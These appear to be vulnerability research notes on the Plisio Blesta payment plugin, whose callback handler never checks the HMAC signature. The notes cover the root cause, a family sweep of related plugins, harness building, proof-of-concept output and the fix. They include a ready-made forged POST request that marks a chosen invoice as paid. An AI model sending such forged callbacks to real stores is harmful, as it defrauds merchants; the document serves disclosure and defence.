# Worked case — Plisio Blesta gateway: forged-callback payment bypass

Concrete session evidence for the class. Target: `github.com/Plisio/blesta-plugin`
(`blesta-plugin/plisio.php`, commit `968dfec…`, 2024-03-18).

## The finding

Blesta routes every payment callback to the gateway's `validate(array $get, array $post)`.
Plisio's `validate()` **never verifies the HMAC signature** — it maps `$post['status']`
straight to a Blesta transaction status, so `status=completed` yields `'status' => 'approved'`
and Blesta marks the invoices in `$get['invoices']` as **PAID**.

The verifier `verifyCallbackData($post, $secretKey)` *exists* (correct
`hash_hmac('sha1', serialize(ksort($post)), api_key)`), but is **dead code**:

```bash
$ grep -rnE 'verifyCallbackData' --include=*.php . | grep -vE 'function verifyCallbackData'
# (no output)  -> never invoked anywhere
```

## Contract proof (official Blesta reference gateways)

```bash
curl -s "https://api.github.com/orgs/blesta/repos?per_page=100" \
  | python3 -c 'import sys,json;[print(r["name"]) for r in json.load(sys.stdin)]'
curl -sL "https://raw.githubusercontent.com/blesta/gateway-coinpayments/master/coin_payments.php"
curl -sL "https://raw.githubusercontent.com/blesta/gateway-perfectmoney/master/perfect_money.php"
```

- **gateway-coinpayments** `validate()` → `$this->checkIpnRequestIsValid($post)`
  with the comment *"Ensure IPN is verified, and validate that the merchant ID is correct"*.
- **gateway-perfectmoney** `validate()` → recomputes `md5(...)`; only sets
  `status = 'approved'` when `$post['V2_HASH'] == $v2_hash`, else returns early and rejects.

Plisio's `validate()` does neither → the required contract is established by the vendor's own code.

## Family sweep results

| product | verifier status |
|---|---|
| blesta-plugin | **VULNERABLE** — verifier dead code |
| woocommerce / easy-digital-downloads | `!=` on HMAC-SHA1 hex (loose compare; hardening note only) |
| opencart-plugin | `!=` compare (present) |
| prestashop-plugin | `hash_equals()` (secure) |
| nodejs / python SDK | `===`/`==` on hex digest (safe) |

Only the handler matters — SDKs are clean.

## PoC bundle (all green)

```
1) plugin as-is   -> forged callback (bogus hash / NO hash) => status='approved'  *** VULNERABLE ***
2) e2e.php        -> Blesta core applies txn => invoice #556 (client 99, $999.00) MARKED PAID
3) harness_fixed  -> [forged,bogus]=NULL(rejected) [forged,none]=NULL(rejected) [legit,signed]=approved
```

Fix verified as root cause: patched copy whose `validate()` first calls `verifyCallbackData()`
rejects forged and accepts legit.

## Secondary finding (low)

`plisio-telegram-bot/callback.php`: `switch ($_POST['status']) { case 'new': /* no break */ case 'completed': … }`
→ an *unpaid* `new` invoice falls through to `completed`. Add `break;`.

## Severity

CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` = **8.2** (integrity-only, honest). Business impact:
customer marks their own invoices paid for free → report as high/critical, don't inflate.

## Harness pitfall hit this session

Stub base class declared `protected $meta = []` while the plugin declares `private $meta`
→ `PHP Fatal error: Access level to Plisio::$meta must be protected (as in class NonmerchantGateway) or weaker`.
Fix: **remove `$meta` from the stub base** and inject via the plugin's `setMeta(['api_key' => …])`.

## Upgrade: the core-verbatim harness (accepted form)

The stub harness above was **challenged** — *"Bisa buktikan akurat valid itu?"* (can you prove that's
accurate/valid?). A stub proves plugin logic, **not core semantics**. The accepted upgrade runs the
**real Blesta core** and embeds the **real dispatch method verbatim**:

```
blesta_forge/
  core_harness.php   real core classes (Container.php, gateway.php, nonmerchant_gateway.php)
                     + VERBATIM excerpt of gateway_payments.php lines 528-698
  run.php            instantiates the REAL plugin, feeds the forged callback, prints the wire request
  verify.sh          re-hashes inputs + re-proves excerpt byte-identity + re-runs exploit
  README.md          root cause / impact / fix / reproduce
```

**Get the real distro** (official download page, not a GitHub mirror):
```bash
curl -sL "https://www.blesta.com/download/" -o blesta_dl.html
grep -oiE 'href="[^"]*download/[0-9]+/blesta-[0-9.]+\.zip"' blesta_dl.html   # all versions
# sort by version, take newest, curl it, sha256sum  ->  blesta-core.zip (73MB)
# sha256 8a38415e2bf4015e38ff0fb7aa11bfe4b738568064e9674e3ab1794476cb5fd3  (6.0.2)
```

**Byte-identity proof** (`verify.sh` stage 2) — the single most convincing artifact:
```
  upstream lines : 171
  harness  lines : 171
  BYTE-IDENTICAL : True      # diff against gateway_payments.php lines 528-698 => 0 differences
```

**Contrast line that proves the bug is in the code, not the harness** (`verify.sh` stage 3):
```
[1] Plisio::verifyCallbackData(forged body, api_key) = false   <- HMAC helper CORRECTLY rejects
[2] handing the SAME forged callback to the real core dispatcher...
-- outcome --
  transaction recorded : #5000  status=approved  amount=149.99 USD  client=1
  invoices marked PAID : 42
>>> BYPASS CONFIRMED: forged callback -> invoice(s) 42 marked PAID.
RESULT: PASS
```

**Wire request** (derived from the plugin's own `buildProcess()` line 90, which concatenates
`?client_id=…&invoices=…` onto `gw_callback_url`; core disables CSRF at `callback.php:20`):
```
POST /callback/gw/1/plisio/?client_id=1&invoices=42=149.99
Content-Type: application/x-www-form-urlencoded

status=completed&order_number=42&source_amount=149.99&source_currency=USD
```

**Dead-code proof, tightened:** `grep -c 'verifyCallbackData' plisio.php` → `1` (definition only,
**zero call sites**). `validate()` at line 119 returns `status => 'approved'` straight from raw input.

**Core files hashed in the bundle** (all from the 6.0.2 distro):
```
b84d048216c5ddea…  components/gateway_payments/gateway_payments.php   (dispatch, lines 528-698)
476fd613d2465168…  app/controllers/callback.php                       (CSRF off, routing)
f53f7c0c13ea3f62…  components/gateways/lib/nonmerchant_gateway.php   (abstract validate())
5a626c0c8c49b271…  app/models/transactions.php                       (apply() marks PAID)
3b2e980ee143c2dd…  plisio.php                                          (vendor plugin)
```

**Two fatal traps when building the core harness:**
1. Excerpt sliced to line 648 → `Unclosed '{'` fatal. The method closes at **698**; slice through it.
2. Real core calls `Configure::get('container')->get('requestor')`, `$this->Logs->add()`, and a private
   `logApplyErrors()` → *"Call to undefined method"*. Add a container stub (returns a `requestor`
   object), a `Loader` stub that injects no-op services, and a private no-op `logApplyErrors()`.
   Stub **only** what the excerpt references — never the logic under test.

